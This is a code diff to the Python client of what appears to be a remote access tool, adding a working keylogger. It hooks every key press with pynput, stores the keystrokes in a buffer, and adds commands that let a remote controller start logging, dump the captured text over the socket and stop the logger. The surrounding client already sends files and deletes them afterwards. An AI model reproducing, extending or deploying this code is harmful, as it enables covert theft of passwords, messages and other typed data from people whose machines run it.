@@ -4,6 +4,7 @@ import pickle
 import platform
 import socket
 import subprocess
+import threading
 import time
 
 import psutil
@@ -13,6 +14,7 @@ from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import padding, rsa
+from pynput.keyboard import Key, Listener
 
 logging.basicConfig(level=logging.CRITICAL)
 
@@ -87,6 +89,29 @@ def kill(proc_pid):
     for proc in process.children(recursive=True):
         proc.kill()
     process.kill()
+
+def OnKeyboardEvent(event):
+    global KeyboardLogs
+
+    try:
+        KeyboardLogs
+    except NameError:
+        KeyboardLogs = ''
+
+    if event == Key.backspace:
+        KeyboardLogs += " [Bck] "
+    elif event == Key.tab:
+        KeyboardLogs += " [Tab] "
+    elif event == Key.enter:
+        KeyboardLogs += "\n"
+    elif event == Key.space:
+        KeyboardLogs += " "
+    elif type(event) == Key:  # if the character is some other type of special key
+        KeyboardLogs += " [" + str(event)[4:] + "] "
+    else:
+        KeyboardLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character
+
+KeyListener = Listener(on_press=OnKeyboardEvent)
 
 
 class Client(object):
@@ -204,6 +229,33 @@ class Client(object):
                 with open(_file, 'rb') as f:
                     self.send(f.read())
                 os.remove(_file)
+                continue
+
+            if data == b'<STARTLOGGER>':
+                if not KeyListener.running:
+                    KeyListener.start()
+                    self.send(b'Started Keylogger\n')
+                    continue
+                self.send(b'Keylogger already running\n')
+                continue
+                
+            if data == b'<DUMP>':
+                global KeyboardLogs
+
+                if not KeyListener.running:
+                    self.send(b'<NOTRUNNING>')
+                else:
+                    self.send(KeyboardLogs.encode())
+                continue
+            
+            if data == b'<STOPLOGGER>':
+                if KeyListener.running:
+                    KeyListener.stop()
+                    threading.Thread.__init__(KeyListener) # re-initialise thread
+                    KeyboardLogs = ''
+                    self.send(b'Keylogger Stopped')
+                    continue
+                self.send(b'Keylogger not running')
                 continue
 
             if data == b'<PASTE>':
